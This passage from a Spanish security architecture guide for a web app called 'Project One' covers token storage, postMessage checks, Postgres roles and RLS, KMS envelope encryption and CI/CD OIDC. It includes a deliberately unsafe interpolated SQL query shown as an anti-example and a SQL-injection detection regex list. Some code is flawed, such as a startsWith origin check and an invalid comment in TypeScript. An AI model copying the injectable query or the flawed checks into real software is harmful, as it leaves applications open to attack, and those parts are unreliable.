  withCredentials: true, // Envía cookies (refresh token, csrf)
});

// Request interceptor - agregar CSRF token
api.interceptors.request.use((config) => {
  // Obtener CSRF token de cookie
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrfToken='))
    ?.split('=')[1];
  
  if (csrfToken && ['post', 'put', 'patch', 'delete'].includes(config.method || '')) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  
  // Idempotency key para mutaciones
  if (['post', 'put', 'patch', 'delete'].includes(config.method || '')) {
    config.headers['Idempotency-Key'] = crypto.randomUUID();
  }
  
  return config;
});

// Response interceptor - manejar 401 (token expirado)
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        // Intentar refresh token
        await api.post('/auth/refresh');
        // Reintentar request original
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh falló → logout
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);

export default api;
```

### 11.4 Token Storage — Comparativa

| Storage | XSS Risk | CSRF Risk | Persistence | Uso Recomendado |
|---------|----------|-----------|-------------|-----------------|
| **Memory (Variable JS)** | Bajo (no persistente) | Ninguno | Session only | **Access Tokens** ✅ Project One usa `sessionStorage` |
| **sessionStorage** | Medio (accesible via XSS) | Ninguno | Tab session | Access Tokens (aceptable con CSP estricto) |
| **localStorage** | Alto (persistente, accesible XSS) | Ninguno | Persistente | **NUNCA para tokens** |
| **HttpOnly Cookie** | Bajo (inaccesible JS) | **Alto** (auto-enviado) | Persistente | **Refresh Tokens** ✅ Project One |
| **HttpOnly + SameSite=Strict** | Bajo | Bajo | Persistente | Ideal para ambos (pero refresh rotation complejo) |

**Recomendación Enterprise Project One**:
- **Access Token**: `sessionStorage` + CSP strict + Trusted Types + short TTL (15m)
- **Refresh Token**: HttpOnly + Secure + SameSite=Strict + partitioned cookie + rotation
- **NUNCA** localStorage para tokens

### 11.5 postMessage Security

```typescript
// apps/client/src/utils/postMessage.ts
interface MessagePayload {
  type: string;
  payload: unknown;
  requestId?: string;
}

const ALLOWED_ORIGINS = [
  'https://app.project-one.com',
  'https://admin.project-one.com',
  // Vercel preview URLs dinámicos - validar pattern
];

export function sendMessage(target: Window, message: MessagePayload, targetOrigin: string) {
  if (!ALLOWED_ORIGINS.some(origin => targetOrigin.startsWith(origin))) {
    throw new Error(`Target origin not allowed: ${targetOrigin}`);
  }
  
  target.postMessage(message, targetOrigin);
}

export function receiveMessage(
  event: MessageEvent,
  handler: (payload: MessagePayload, origin: string) => void
) {
  // Validar origin
  const isAllowed = ALLOWED_ORIGINS.some(origin => 
    event.origin === origin || 
    (origin.includes('*') && event.origin.match(new RegExp(origin.replace('*', '.*'))))
  );
  
  if (!isAllowed) {
    console.warn('postMessage blocked: unauthorized origin', event.origin);
    return;
  }
  
  // Validar estructura
  if (!event.data || typeof event.data !== 'object' || !event.data.type) {
    console.warn('postMessage blocked: invalid message structure');
    return;
  }
  
  handler(event.data as MessagePayload, event.origin);
}

// Uso en componente
useEffect(() => {
  const handleMessage = (event: MessageEvent) => {
    receiveMessage(event, (payload, origin) => {
      switch (payload.type) {
        case 'AUTH_STATE_CHANGE':
          // Actualizar estado auth
          break;
        case 'PAYMENT_COMPLETE':
          // Manejar pago
          break;
      }
    });
  };
  
  window.addEventListener('message', handleMessage);
  return () => window.removeEventListener('message', handleMessage);
}, []);
```

### 11.6 Subresource Integrity (SRI)

```html
<!-- Para recursos CDN críticos -->
<script 
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-..." 
  crossorigin="anonymous"
></script>
<link 
  rel="stylesheet" 
  href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.0/dist/tailwind.min.css"
  integrity="sha384-..." 
  crossorigin="anonymous"
/>
```

**Generación SRI en build** (Vite plugin):
```typescript
// vite.config.ts
import { defineConfig } from 'vite';
import { vitePluginSri } from 'vite-plugin-sri';

export default defineConfig({
  plugins: [
    vitePluginSri({
      hash: 'sha384',
      crossorigin: 'anonymous',
    }),
  ],
});
```

---

## 12. Seguridad PostgreSQL + Prisma

### 12.1 Least Privilege Database Users

```sql
-- Usuario aplicación (mínimos privilegios)
CREATE ROLE app_user WITH LOGIN PASSWORD '...' NOINHERIT;
GRANT CONNECT ON DATABASE project_one TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;

-- Solo SELECT/INSERT/UPDATE/DELETE en tablas necesarias
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
-- NO GRANT TRUNCATE, REFERENCES, TRIGGER

-- Usuario migraciones (solo para CI/CD)
CREATE ROLE migrate_user WITH LOGIN PASSWORD '...' NOINHERIT;
GRANT CONNECT ON DATABASE project_one TO migrate_user;
GRANT USAGE, CREATE ON SCHEMA public TO migrate_user;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO migrate_user;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO migrate_user;

-- Usuario read-only (reporting, analytics)
CREATE ROLE readonly_user WITH LOGIN PASSWORD '...' NOINHERIT;
GRANT CONNECT ON DATABASE project_one TO readonly_user;
GRANT USAGE ON SCHEMA public TO readonly_user;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_user;

-- Usuario admin (solo break-glass, MFA requerido)
CREATE ROLE admin_user WITH LOGIN PASSWORD '...' NOINHERIT;
GRANT ALL PRIVILEGES ON DATABASE project_one TO admin_user;
```

### 12.2 Row Level Security (RLS) — Multi-Tenancy Futuro

```sql
-- Habilitar RLS en tablas multi-tenant
ALTER TABLE tenants ENABLE ROW LEVEL SECURITY;
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE products ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- Política: usuarios solo ven su tenant
CREATE POLICY tenant_isolation ON users
  USING (tenant_id = current_setting('app.current_tenant_id')::uuid);

CREATE POLICY tenant_isolation ON products
  USING (tenant_id = current_setting('app.current_tenant_id')::uuid);

-- Política: admins ven todo (bypass RLS)
CREATE POLICY admin_bypass ON users
  USING (current_setting('app.current_user_role') = 'admin');

-- Función para establecer contexto (llamada en middleware Prisma)
CREATE OR REPLACE FUNCTION set_app_context(tenant_id uuid, user_role text)
RETURNS void LANGUAGE plpgsql AS $$
BEGIN
  PERFORM set_config('app.current_tenant_id', tenant_id::text, false);
  PERFORM set_config('app.current_user_role', user_role, false);
END;
$$;
```

**Middleware Prisma para RLS**:
```typescript
// apps/server/src/middleware/prismaRls.ts
import { PrismaClient } from '@prisma/client';

export const prismaWithRls = (prisma: PrismaClient, tenantId: string, userRole: string) => {
  return prisma.$extends({
    query: {
      $allModels: {
        async $allOperations({ args, query }) {
          // Establecer contexto RLS antes de cada query
          await prisma.$executeRawUnsafe(
            `SELECT set_app_context($1, $2)`,
            tenantId,
            userRole
          );
          return query(args);
        },
      },
    },
  });
};
```

### 12.3 Encryption at Rest

| Capa | Estado | Configuración |
|------|--------|---------------|
| **RDS Storage Encryption** | ✅ | AWS KMS managed key (default) o CMK customer-managed |
| **TDE (Transparent Data Encryption)** | ⚠️ Parcial | RDS encryption = TDE a nivel storage; **column-level encryption faltante** |
| **Application-Level Encryption** | ❌ | PII (email, phone, SSN) sin cifrado a nivel aplicación |
| **Backup Encryption** | ✅ | Snapshots RDS heredaron encryption |

**Column-Level Encryption (pgcrypto)**:
```sql
-- Extensión pgcrypto (disponible en RDS)
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Clave maestra en AWS KMS / Vault (rotación automática)
-- Clave derivada por tenant/entorno

-- Ejemplo: cifrar email
UPDATE users SET 
  email_encrypted = pgp_sym_encrypt(email, current_setting('app.encryption_key')),
  email_hash = crypt(email, gen_salt('bf')) -- Para búsqueda/verificación
WHERE email_encrypted IS NULL;

-- Índice en hash para lookup
CREATE INDEX idx_users_email_hash ON users(email_hash);

-- Vista para aplicación (desencripta on-the-fly)
CREATE VIEW users_decrypted AS
SELECT 
  id,
  pgp_sym_decrypt(email_encrypted, current_setting('app.encryption_key')) AS email,
  first_name,
  last_name,
  tenant_id,
  created_at
FROM users;
```

### 12.4 PITR, Masking, Audit, Pooling

| Feature | Configuración | Project One |
|---------|---------------|-------------|
| **PITR (Point-in-Time Recovery)** | RDS automated backups + transaction logs | ✅ 35 días retention |
| **Data Masking** | Dynamic masking policies (RDS) / Views | ❌ No implementado |
| **Audit Logging** | `pgaudit` extension + RDS logging | ⚠️ Parcial (solo error logs) |
| **Connection Pooling** | PgBouncer (RDS Proxy) / Prisma pool | ✅ Prisma connection pool configurado |

**pgaudit Configuración**:
```sql
-- postgresql.conf (RDS parameter group)
shared_preload_libraries = 'pgaudit'
pgaudit.log = 'all, -misc' -- Log all except misc
pgaudit.log_level = 'log'
pgaudit.log_parameter = 'on'
pgaudit.log_statement_once = 'off'
pgaudit.log_catalog = 'off'

-- Ver logs en CloudWatch Logs / RDS Enhanced Monitoring
```

### 12.5 SQL Injection Prevention (Prisma)

```typescript
// Prisma usa parameterized queries por defecto - SEGURO
// ✅ BIEN
const users = await prisma.user.findMany({
  where: { email: userInput }, // Parameterized
});

// ✅ BIEN - Raw query con parámetros
const users = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${userInput}`;

// ❌ NUNCA - String interpolation
const users = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${userInput}'`);

// Validación adicional en middleware
export const preventSqlInjection = (req, res, next) => {
  const checkValue = (val: any) => {
    if (typeof val === 'string') {
      // Detectar patrones SQL injection comunes
      const sqlPatterns = [
        /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC)\b)/i,
        /(--|\/\*|\*\/|;|'|"|`)/,
        /(\b(OR|AND)\b\s+\d+\s*=\s*\d+)/i, -- 1=1
      ];
      if (sqlPatterns.some(p => p.test(val))) {
        throw new Error('Potential SQL injection detected');
      }
    }
  };
  
  [req.body, req.query, req.params].forEach(obj => {
    if (obj) Object.values(obj).forEach(checkValue);
  });
  
  next();
};
```

### 12.6 Secrets en Base de Datos

```typescript
// NUNCA almacenar secrets en DB
// ❌ MAL
await prisma.apiKey.create({ data: { key: 'sk_live_...', userId } });

// ✅ BIEN - Referencia a secret manager
await prisma.apiKey.create({ 
  data: { 
    keyRef: 'aws-secretsmanager:project-one/prod/stripe-secret-key',
    userId 
  } 
});

// Recuperación en runtime
async function getApiKey(keyRef: string) {
  const [provider, secretPath] = keyRef.split(':', 2);
  if (provider === 'aws-secretsmanager') {
    return await secretsManager.getSecretValue({ SecretId: secretPath }).promise();
  }
  // Vault, Doppler, etc.
}
```

---

## 13. Criptografía Aplicada

### 13.1 KMS / HSM / Envelope Encryption

```mermaid
graph TD
    subgraph APP["Application Layer"]
        DATA[Plaintext Data]
        DEK[Data Encryption Key\nAES-256-GCM / ChaCha20-Poly1305]
    end
    
    subgraph KMS["Key Management Service\nAWS KMS / GCP KMS / Vault"]
        KEK[Key Encryption Key\nRSA-4096 / ECC-P384 / HSM-backed]
        WRAP[Wrap/Unwrap Operations]
        AUDIT[Audit Logging\nCloudTrail / Audit Logs]
    end
    
    subgraph HSM["Hardware Security Module\nFIPS 140-2 Level 3 / Level 4"]
        ROOT[Root Keys\nGeneration + Storage]
        ATTEST[Key Attestation]
    end
    
    DATA -->|Encrypt| DEK
    DEK -->|Wrap| KEK
    KEK -->|Protected by| ROOT
    WRAP -->|Audit| AUDIT
    ROOT -->|Attestation| ATTEST
    
    style DEK fill:#fef08a,stroke:#ca8a04
    style KEK fill:#ffcccc,stroke:#dc2626
    style ROOT fill:#bbf7d0,stroke:#16a34a
```

**Envelope Encryption Implementation**:
```typescript
// apps/server/src/crypto/envelopeEncryption.ts
import { KMSClient, EncryptCommand, DecryptCommand, GenerateDataKeyCommand } from '@aws-sdk/client-kms';
import { createCipheriv, createDecipheriv, randomBytes, createHash } from 'crypto';

const kms = new KMSClient({ region: process.env.AWS_REGION });
const KEK_KEY_ID = process.env.KMS_KEK_KEY_ID!; // ARN o alias
const ALGORITHM = 'aes-256-gcm'; // O 'chacha20-poly1305'
const IV_LENGTH = 12; // 96 bits para GCM
const TAG_LENGTH = 16;
const SALT_LENGTH = 32;

export interface EncryptedEnvelope {
  ciphertext: Buffer;
  iv: Buffer;
  authTag: Buffer;
  wrappedDek: Buffer; // DEK cifrado con KEK
  keyId: string; // KMS Key ID usado
  algorithm: string;
}

export async function envelopeEncrypt(plaintext: Buffer | string): Promise<EncryptedEnvelope> {
  const data = Buffer.isBuffer(plaintext) ? plaintext : Buffer.from(plaintext, 'utf8');
  
  // 1. Generar DEK (Data Encryption Key) via KMS
  const { Plaintext: dek, CiphertextBlob: wrappedDek, KeyId } = await kms.send(
    new GenerateDataKeyCommand({
      KeyId: KEK_KEY_ID,
      KeySpec: 'AES_256',
      EncryptionContext: {
        application: 'project-one',
        purpose: 'data-encryption',
      },
    })
  );
  
  if (!dek || !wrappedDek || !KeyId) {
    throw new Error('KMS GenerateDataKey failed');
  }
  
  // 2. Cifrar datos con DEK (AES-GCM)
  const iv = randomBytes(IV_LENGTH);
  const cipher = createCipheriv(ALGORITHM, dek, iv, { authTagLength: TAG_LENGTH });
  
  const ciphertext = Buffer.concat([cipher.update(data), cipher.final()]);
  const authTag = cipher.getAuthTag();
  
  // 3. Zeroize DEK en memoria
  dek.fill(0);
  
  return {
    ciphertext,
    iv,
    authTag,
    wrappedDek,
    keyId: KeyId,
    algorithm: ALGORITHM,
  };
}

export async function envelopeDecrypt(envelope: EncryptedEnvelope): Promise<Buffer> {
  // 1. Desenvolver DEK con KMS
  const { Plaintext: dek } = await kms.send(
    new DecryptCommand({
      CiphertextBlob: envelope.wrappedDek,
      EncryptionContext: {
        application: 'project-one',
        purpose: 'data-encryption',
      },
    })
  );
  
  if (!dek) throw new Error('KMS Decrypt failed');
  
  // 2. Descifrar datos
  const decipher = createDecipheriv(envelope.algorithm, dek, envelope.iv, {
    authTagLength: TAG_LENGTH,
  });
  decipher.setAuthTag(envelope.authTag);
  
  const plaintext = Buffer.concat([decipher.update(envelope.ciphertext), decipher.final()]);
  
  // 3. Zeroize DEK
  dek.fill(0);
  
  return plaintext;
}

// Uso para PII
async function encryptPii(email: string) {
  const envelope = await envelopeEncrypt(email);
  // Guardar envelope en DB (JSONB)
  return envelope;
}

async function decryptPii(envelope: EncryptedEnvelope) {
  const plaintext = await envelopeDecrypt(envelope);
  return plaintext.toString('utf8');
}
```

### 13.2 Key Rotation

```typescript
// apps/server/src/crypto/keyRotation.ts
import { KMSClient, ScheduleKeyDeletionCommand, EnableKeyRotationCommand } from '@aws-sdk/client-kms';

const kms = new KMSClient({ region: process.env.AWS_REGION });

// Habilitar rotación automática anual (AWS KMS)
export async function enableKeyRotation(keyId: string) {
  await kms.send(new EnableKeyRotationCommand({ KeyId: keyId }));
}

// Rotación manual con grace period (para DEKs envueltos)
// Estrategia: Nueva KEK version → re-wrap DEKs gradualmente
export async function rotateKek(oldKeyId: string, newKeyId: string) {
  // 1. Listar todos los envelopes que usan oldKeyId
  // 2. Para cada envelope: decrypt con oldKeyId → encrypt con newKeyId
  // 3. Actualizar registro en DB
  // 4. Después de grace period (30 días): schedule old key deletion
  await kms.send(new ScheduleKeyDeletionCommand({ 
    KeyId: oldKeyId, 
    PendingWindowInDays: 30 
  }));
}
```

### 13.3 TLS 1.3, mTLS, Certificate Pinning

| Protocolo | Configuración | Project One |
|-----------|---------------|-------------|
| **TLS Version** | Mínimo TLS 1.2, preferir TLS 1.3 | ✅ ALB/TLS termination en AWS usa TLS 1.2+ |
| **Cipher Suites** | Solo AEAD (AES-GCM, ChaCha20-Poly1305) | ✅ AWS managed policies |
| **Certificate** | Public CA (Let's Encrypt / DigiCert) + ACM | ✅ ACM managed |
| **mTLS** | Cliente + servidor certificados X.509 | ⚠️ Proyectado (Envoy sidecar) |
| **Certificate Pinning** | HPKP (deprecated) → Expect-CT + CT logs | ⚠️ Expect-CT configurado, pinning nativo en mobile apps |
| **OCSP Stapling** | Habilitado en ALB/CloudFront | ✅ AWS managed |

**mTLS con Envoy Sidecar (Project One)**:
```yaml
# apps/server/envoy.yaml (sidecar config)
static_resources:
  listeners:
  - name: inbound
    address:
      socket_address:
        address: 127.0.0.1
        port_value: 8443
    filter_chains:
    - filter_chain_match:
        transport_protocol: "tls"
      tls_context:
        common_tls_context:
          tls_certificates:
          - certificate_chain:
              filename: "/etc/envoy/certs/server-cert.pem"
            private_key:
              filename: "/etc/envoy/certs/server-key.pem"
          validation_context:
            trusted_ca:
              filename: "/etc/envoy/certs/ca-cert.pem"
            verify_subject_alt_name:
            - "spiffe://project-one/ns/default/sa/api"
      filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
          route_config:
            name: local_route
            virtual_hosts:
            - name: local_service
              domains: ["*"]
              routes:
              - match: { prefix: "/" }
                route: { cluster: app }
          http_filters:
          - name: envoy.filters.http.router
  
  clusters:
  - name: app
    connect_timeout: 5s
    type: STATIC
    load_assignment:
      cluster_name: app
      endpoints:
      - lb_endpoints:
        - endpoint:
            address:
              socket_address:
                address: 127.0.0.1
                port_value: 3000  # Express app
    transport_socket:
      name: envoy.transport_sockets.tls
      typed_config:
        "@type": type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext
        common_tls_context:
          tls_certificates:
          - certificate_chain:
              filename: "/etc/envoy/certs/client-cert.pem"
            private_key:
              filename: "/etc/envoy/certs/client-key.pem"
          validation_context:
            trusted_ca:
              filename: "/etc/envoy/certs/ca-cert.pem"
            verify_subject_alt_name:
            - "spiffe://project-one/ns/default/sa/app"
```

### 13.4 AES-GCM vs ChaCha20-Poly1305

| Característica | AES-256-GCM | ChaCha20-Poly1305 |
|----------------|-------------|-------------------|
| **Hardware Acceleration** | AES-NI (x86, ARMv8) | Software-friendly, constante-time |
| **Performance (no AES-NI)** | Lento, vulnerable a timing attacks | Rápido, constante-time nativo |
| **Nonce Reuse Risk** | Catastrófico (key + nonce reuse = broken) | Similar, pero más tolerante |
| **Standardization** | NIST FIPS 140-2/3 approved | RFC 8439, IETF, WireGuard, TLS 1.3 |
| **Recommendation** | **Default** cuando AES-NI disponible | **Preferred** para mobile, IoT, sin AES-NI, o defense-in-depth |

**Project One**: `aes-256-gcm` por defecto (servidores modernos con AES-NI), `chacha20-poly1305` como fallback configurable.

---

## 14. Secret Management

### 14.1 Comparativa Soluciones

| Solución | Tipo | Fortalezas | Debilidades | Uso Project One |
|----------|------|------------|-------------|-----------------|
| **AWS Secrets Manager** | Cloud managed | Integración AWS nativa, rotación lambda, IAM fine-grained, cross-account | Costo ($0.40/secret/mes + API calls), vendor lock-in | **Producción** (RDS credentials, API keys, JWT keys) |
| **HashiCorp Vault** | Self-hosted / SaaS | Dynamic secrets, PKI, database creds, multi-cloud, open source | Complejidad operacional, expertise requerido | **Evaluación futura** (multi-cloud/hybrid) |
| **Doppler** | SaaS | DX excelente, CLI, sync automático, CI/CD integración, gratis para equipos pequeños | SaaS externo, costo escala | **Desarrollo/Staging** (reemplaza .env) |
| **Infisical** | Open source / SaaS | E2E encryption, Git-like workflow, self-hostable, gratis | Menos maduro que Vault | **Alternativa open source** |
| **GitHub Actions Secrets** | CI/CD native | Gratis, OIDC federation, scoping por environment/repo | Solo CI/CD, no runtime | **Pipeline secrets** (AWS credentials via OIDC, npm token) |
| **1Password / Bitwarden Secrets** | Developer tools | CLI, SSH agent, biometric unlock, team sharing | No runtime injection nativo | **Developer local secrets** |

### 14.2 OIDC Federation (GitHub Actions → AWS) — Sin Long-Lived Keys

```yaml
# .github/workflows/deploy.yml - OIDC Federation
permissions:
  id-token: write  # REQUERIDO para OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      
      # Configurar AWS credentials via OIDC (NO access keys!)
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActions-DeployRole
          aws-region: us-east-1
          role-session-name: GitHubActions-${{ github.run_id }}
      
      # Ahora tienes credenciales temporales (1 hora) con permisos del role
      - name: Deploy to ECS
        run: |
          aws ecs update-service --cluster project-one-prod --service api --force-new-deployment
```

**IAM Role Trust Policy (AWS)**:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/project-one:*",
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringEquals": {
          "token.actions.githubusercontent.com:repository": "myorg/project-one"
        }
      }
    }
  ]
}
```

### 14.3 Secret Rotation Strategy

| Secret Type | Rotation Frequency | Method | Automation |
|-------------|-------------------|--------|------------|
| **Database Credentials** | 30-90 días | AWS Secrets Manager rotation lambda | ✅ Automático |
| **JWT Signing Keys** | 30 días (RS256/EdDSA) | KMS key rotation + grace period | ✅ Automático (KMS) |
| **API Keys (Stripe, SendGrid, etc.)** | 90 días | Provider dashboard + secret manager update | ⚠️ Semi-automático (webhook notification) |
| **TLS Certificates** | 90 días (Let's Encrypt) / 1 año (pagados) | ACM auto-renewal | ✅ Automático |
| **GitHub Actions OIDC** | N/A (no long-lived) | N/A | N/A |
| **Encryption Keys (KMS)** | 1 año (auto) / 30 días (manual) | KMS auto-rotation / manual schedule | ✅ Automático |

---

## 15. AST Family Completa — Taxonomía Herramientas

### 15.1 Matriz Comparativa

| Categoría | Herramientas | Tipo | Integración CI/CD | Cuándo Usar | Project One |
|-----------|--------------|------|-------------------|-------------|-------------|
| **SAST** | CodeQL, Semgrep, SonarQube, Snyk Code, Checkmarx, Veracode | Static Analysis | Pre-commit, CI PR, Nightly | Every commit, PR gate, compliance | ✅ CodeQL + Semgrep (pre-commit + CI) |
| **DAST** | OWASP ZAP, Burp Suite, Nikto, Nuclei, w3af | Dynamic Analysis | Staging deploy, scheduled | Pre-prod, periodic, API testing | ❌ Pendiente (Sprint 4) |
| **IAST** | Contrast Security, Datadog ASM, Seeker, Hdiv | Runtime Instrumentation | Production, staging | Real-time detection, zero false positives | ❌ Pendiente (evaluando Datadog ASM) |
| **SCA** | Trivy, Snyk, Dependabot, Renovate, OSV-Scanner, Grype | Dependency Scanning | CI PR, scheduled, pre-commit | Every build, dependency update | ✅ Trivy (CI) + Dependabot (plan) |
| **Secret Scan** | Gitleaks, TruffleHog, GitHub Secret Scanning, detect-secrets | Secret Detection | Pre-commit, CI PR, scheduled, history | Every commit, PR, history scan | ✅ Gitleaks (pre-commit + CI) + GitHub native |
| **Container Scan** | Trivy, Grype, Snyk Container, Docker Scout, Anchore | Image Scanning | Build pipeline, registry scan, admission | Every image build, deploy gate | ⚠️ Parcial (Trivy filesystem only) |
| **IaC Scan** | Checkov, tfsec, KICS, Semgrep IaC, Terrascan, OPA | Infrastructure Code | CI PR, pre-commit, admission | Every Terraform/Pulumi change | ❌ No IaC yet (plan Terraform) |
| **License** | Snyk License, FOSSA, ScanCode, ClearlyDefined, ORT | License Compliance | CI PR, release gate | Every release, compliance audit | ❌ Pendiente |
| **SBOM Gen** | Syft, sbom-action, CycloneDX CLI, SPDX tools, Trivy | SBOM Generation | Build pipeline, release | Every release, supply chain compliance | ⚠️ Parcial (anchore/sbom-action plan) |

### 15.2 Diferencias Clave y Cuándo Usar

#### SAST: CodeQL vs Semgrep
| Aspecto | CodeQL | Semgrep |
|---------|--------|---------|
| **Engine** | Query-based (QL), deep semantic analysis | Pattern-matching (YAML), fast, lightweight |
| **Languages** | 10+ (JS, TS, Python, Java, Go, C#, etc.) | 30+ (más amplio) |
| **False Positives** | Menos (análisis semántico profundo) | Más (pattern-based), pero rules personalizables |
| **Speed** | Lento (minutos) | Rápido (segundos) |
| **Custom Rules** | QL (curva aprendizaje alta) | YAML (fácil, similar a grep) |
| **CI Integration** | GitHub Actions nativo | GitHub Actions, GitLab, Jenkins, local |
| **Best For** | Deep analysis, compliance, nightly | Fast feedback, pre-commit, PR gates, custom rules |

**Project One**: **Ambos**. Semgrep pre-commit + PR (fast feedback), CodeQL nightly/PR (deep analysis).

#### SCA: Trivy vs Dependabot vs Renovate
| Aspecto | Trivy | Dependabot | Renovate |
|---------|-------|------------|----------|
| **Scope** | Filesystem, container, IaC, config | GitHub native, npm ecosystem | Multi-platform, multi-ecosystem |
| **Vuln DB** | Trivy DB (NVD, GHSA, etc.) | GitHub Advisory Database | Multiple sources (OSV, GHSA, etc.) |
| **Remediation** | Report only | Auto-PR with fixes | Auto-PR, grouping, scheduling |
| **License Scan** | ✅ | ❌ | ✅ |
| **Configuration** | CLI, CI/CD | `.github/dependabot.yml` | `renovate.json` |
| **Best For** | Comprehensive scanning, containers | Zero-config, GitHub native | Advanced automation, monorepos |

**Project One**: Trivy (CI scan) + Dependabot (auto-PR remediation) + Renovate (evaluación futura para grouping avanzado).

#### Secret Scanning: Gitleaks vs TruffleHog vs GitHub Native
| Aspecto | Gitleaks | TruffleHog | GitHub Secret Scanning |
|---------|----------|------------|------------------------|
| **Engine** | Regex + entropy | Regex + entropy + verification (active verification) | Proprietary patterns + partner patterns |
| **Verification** | ❌ Solo detection | ✅ Active verification (API calls) | ✅ Partner verification |
| **Speed** | Rápido | Medio (verification toma tiempo) | Nativo (async) |
| **History Scan** | ✅ Full repo | ✅ Full repo | ✅ Full repo |
| **Pre-commit** | ✅ Native | ✅ Native | ❌ Solo push/PR |
| **Cost** | Gratis (OSS) | Gratis (OSS) | Gratis (público), GHAS (privado) |
| **Best For** | CI gates, pre-commit, local | High-confidence detection, verification | Always-on, push protection, compliance |

**Project One**: **Capas múltiples** — Gitleaks pre-commit (staged) + Gitleaks CI (PR diff) + GitHub Secret Scanning (push protection) + Gitleaks scheduled (full history weekly).

### 15.3 Integración CI/CD Project One (Actual + Plan)

```mermaid
graph LR
    subgraph PRE_COMMIT["🔒 PRE-COMMIT (Local)"]
        PC1[Semgrep SAST\nstaged files]
        PC2[Gitleaks\nstaged secrets]
        PC3[lint-staged\nESLint + Prettier]
    end
    
    subgraph PR["🔄 PULL REQUEST (CI)"]
        PR1[CodeQL SAST\nJavaScript]
        PR2[Semgrep SAST\np/owasp-top-ten + custom]
        PR3[Trivy SCA\nfilesystem HIGH/CRITICAL]
        PR4[Gitleaks\nPR diff]
        PR5[GitHub Secret Scanning\npush protection]
        PR6[Dependency Review\nPR dependency changes]
        PR7[Container Scan\nTrivy image (plan)]
        PR8[IaC Scan\nCheckov/KICS (plan)]
        PR9[License Scan\nFOSSA/ScanCode (plan)]
        PR10[SBOM Gen\nCycloneDX + SPDX]
    end
    
    subgraph NIGHTLY["🌙 NIGHTLY / SCHEDULED"]
        N1[CodeQL Full\nDeep analysis]
        N2[Trivy Full\nAll severities]
        N3[Gitleaks Full History\nAll refs]
        N4[SBOM Update\nWeekly]
        N5[License Audit\nWeekly]
        N6[Container Scan Registry\nAll tags]
    end
    
    subgraph RELEASE["🚀 RELEASE"]
        R1[SLSA Provenance L3]
        R2[Artifact Signing\ncosign keyless]
        R3[SBOM Attach\nCycloneDX + SPDX]
        R4[VEX Assessment\nExploitability]
        R5[Policy Enforce\nKyverno/OPA]
    end
    
    PRE_COMMIT --> PR
    PR --> NIGHTLY
    PR --> RELEASE
    
    style PRE_COMMIT fill:#bbf7d0,stroke:#16a34a
    style PR fill:#a5f3fc,stroke:#0891b2
    style NIGHTLY fill:#fef08a,stroke:#ca8a04
    style RELEASE fill:#e9d5ff,stroke:#a855f7
```

---

## 16. CI/CD Security Enterprise (APARTADO ESTRELLA)

> **Esta es la sección más detallada y crítica del documento. Cubre hardening pipeline, SLSA, sigstore, artifact signing, SBOM/VEX, runner security, GH Environments, attack vectors, pipeline YAML completo, y diagrama DevSecOps end-to-end.**

### 16.1 Pipeline Hardening

#### 16.1.1 OIDC Federation AWS (Zero Long-Lived Secrets)

```yaml
# .github/workflows/ci.yml - OIDC para AWS en jobs que lo necesiten
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # REQUERIDO para OIDC
      contents: read
    steps:
      - uses: actions/checkout@v5
      
      - name: Configure AWS Credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_STAGING_ROLE_ARN }}
          aws-region: us-east-1
          role-session-name: CI-Staging-${{ github.run_id }}
      
      # Credenciales temporales (1h) disponibles como env vars:
      # AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
      - name: Deploy to Staging
        run: |
          aws ecs update-service --cluster project-one-staging --service api --force-new-deployment
```

**Configuración IAM Role (Trust Policy)**:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/project-one:*"
        }
      }
    }
  ]
}
```

#### 16.1.2 Least-Privilege GITHUB_TOKEN

```yaml
# .github/workflows/ci.yml - Permisos mínimos por job
jobs:
  quality:
    permissions:
      contents: read           # Checkout code
      # NO write permissions
    
  security:
